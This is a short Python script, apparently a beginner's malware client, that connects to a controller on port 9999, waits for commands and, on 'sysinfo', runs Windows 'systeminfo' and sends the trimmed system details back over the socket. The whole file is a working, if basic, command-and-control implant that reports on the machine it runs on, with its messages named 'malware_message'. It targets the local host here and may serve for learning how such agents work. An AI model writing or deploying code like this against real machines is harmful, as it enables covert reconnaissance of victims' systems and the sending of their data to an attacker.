import socket
import subprocess

# This function removes the redundant part of the input_string
def string_slicer(input_string):
    last_index = input_string.find("Network Card")
    return input_string[:last_index]


HOST_INFO = (socket.gethostbyname(socket.gethostname()), 9999)
BUFFER_SIZE = 64
CODING = "utf-8"

# Main part of the code starts here
main_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
main_socket.connect(HOST_INFO)
print(main_socket.recv(BUFFER_SIZE).decode(CODING))


while True:
    server_message_size = main_socket.recv(BUFFER_SIZE).decode(CODING)
    server_message = main_socket.recv(int(server_message_size)).decode(CODING).rstrip()
    if server_message == "sysinfo":
        subprocess_result = subprocess.Popen("systeminfo", stdout=subprocess.PIPE).communicate()[0].decode()
        malware_message = string_slicer(subprocess_result)
        malware_message = malware_message.encode(CODING)
        malware_message_size = len(malware_message)
        malware_message_size = str(malware_message_size)
        malware_message_size += " " * (BUFFER_SIZE - len(malware_message_size))
        malware_message_size = malware_message_size.encode(CODING)
        main_socket.send(malware_message_size)
        main_socket.send(malware_message)
    else:
        malware_message = "This command is not defined"
        malware_message = malware_message.encode(CODING)
        malware_message_size = len(malware_message)
        malware_message_size = str(malware_message_size)
        malware_message_size += " " * (BUFFER_SIZE - len(malware_message_size))
        malware_message_size = malware_message_size.encode(CODING)
        main_socket.send(malware_message_size)
        main_socket.send(malware_message)










